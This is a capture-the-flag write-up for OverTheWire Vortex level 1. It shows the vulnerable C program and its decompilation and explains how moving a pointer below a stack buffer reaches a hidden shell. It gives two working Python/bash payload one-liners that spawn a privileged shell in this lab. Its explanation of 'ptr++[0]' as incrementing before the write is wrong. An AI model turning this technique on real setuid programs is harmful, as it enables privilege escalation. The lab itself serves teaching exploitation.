Overthewire Vortex Level 1 Writeup

Source code:

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>


#define e(); if(((unsigned int)ptr & 0xff000000)==0xca000000) { setresuid(geteuid(), geteuid(), geteuid()); execlp("/bin/sh", "sh", "-i", NULL); }

void print(unsigned char *buf, int len)
{
        int i;

        printf("[ ");
        for(i=0; i < len; i++) printf("%x ", buf[i]);
        printf(" ]\n");
}

int main()
{
        unsigned char buf[512];
        unsigned char *ptr = buf + (sizeof(buf)/2);
        unsigned int x;

        while((x = getchar()) != EOF) {
                switch(x) {
                        case '\n': print(buf, sizeof(buf)); continue; break;
                        case '\\': ptr--; break;
                        default: e(); if(ptr > buf + sizeof(buf)) continue; ptr++[0] = x; break;
                }
        }
        printf("All done\n");
}
```

First check the stack layout. From the decompiled version:

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __uid_t v3; // esi@8
  __uid_t v4; // ebx@8
  __uid_t v5; // eax@8
  unsigned int v6; // eax@10
  int result; // eax@12
  int v8; // ecx@12
  unsigned int v9; // [sp+14h] [bp-214h]@1
  int v10; // [sp+18h] [bp-210h]@11
  int v11; // [sp+1Ch] [bp-20Ch]@5
  int v12; // [sp+11Ch] [bp-10Ch]@1
  int v13; // [sp+21Ch] [bp-Ch]@1

  v13 = *MK_FP(__GS__, 20);
  v9 = (unsigned int)&v12;
  while ( 1 )
  {
    v10 = getchar();
    if ( v10 == -1 )
      break;
    if ( v10 == 10 )
    {
      print((int)&v11, 512);
    }
    else if ( v10 == 92 )
    {
      --v9;
    }
    else
    {
      if ( (v9 & 0xFF000000) == -905969664 )
      {
        v3 = geteuid();
        v4 = geteuid();
        v5 = geteuid();
        setresuid(v5, v4, v3);
        execlp("/bin/sh", "sh", 0);
      }
      if ( v9 <= (unsigned int)&v13 )
      {
        v6 = v9++;
        *(_BYTE *)v6 = v10;
      }
    }
  }
  puts("All done");
  result = 0;
  v8 = *MK_FP(__GS__, 20) ^ v13;
  return result;
}
```

Clearly `v9` is `ptr`, `v11` is `buf`. Newbie of programming language may feel confused of seeing `ptr++[0] = x;`. This means increase `ptr` then give `x` to the address which `ptr` points to(looks non-intuitive, since operator `++` stands after `ptr`).

There are 4 ways of handling EOF of bash. But I think the most simple way is below(since you don't need to hardcode bash command to your payload, it provides more flexibility):

```
$ (python -c 'print "\\"*261+"\xca"*4000';cat) | /vortex/vortex1
```

First use 261 `\` to decrease `ptr`. When vortex1 reads `\xca`, it adds 1 to `ptr` and writes the value to address `buf-0x4`. We need extra `\xca`s because of the mechanism of kernel by handling buffered input. Characters more than a page size(normally 4096 bytes) can force the circular buffer inside kernel to be flushed. You can also force it manually:

```
$ (python -c 'import sys ; print "\\" * 261 +"\xcaA\n";sys.stdout.flush();';cat) |/vortex/vortex1
```

